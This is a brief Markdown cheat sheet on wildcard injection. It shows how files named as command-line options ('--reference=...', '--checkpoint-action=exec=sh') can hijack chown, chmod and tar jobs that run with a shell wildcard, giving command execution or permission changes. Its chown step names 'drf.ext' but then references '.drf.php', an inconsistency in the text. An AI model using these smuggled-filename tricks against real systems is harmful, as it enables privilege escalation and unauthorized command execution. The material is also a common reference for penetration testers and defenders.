# Wildcard Exploits

## Chown & Chmod

Case

```
chown -R nobody:nobody folder/*.ext
chmod -R 620 folder/*.ext
```

Exploitation:

1. Navigate to the folder
2. Create a file called drf.ext
3. Create a file called --reference=.drf.php
4. When the script is executed it will read the filename specified at point 3 as a parameter and override the owner or permissions specified in the script with the one of the file pointed by the instruction (in this case drf.ext)

## Tar

Case

```
tar cvf archive.tar *
```

Exploitation:

1. Navigate to the folder
2. Create a file called --checkpoint=1
3. Create a file called --checkpoint-action=exec=sh \<cmd or script>
4. On execution the command specified will be executed. Keep in mind that path separators are forbidden in filenames, as such your script should be in the same folder of the files created previously or in a path defined in your env variables
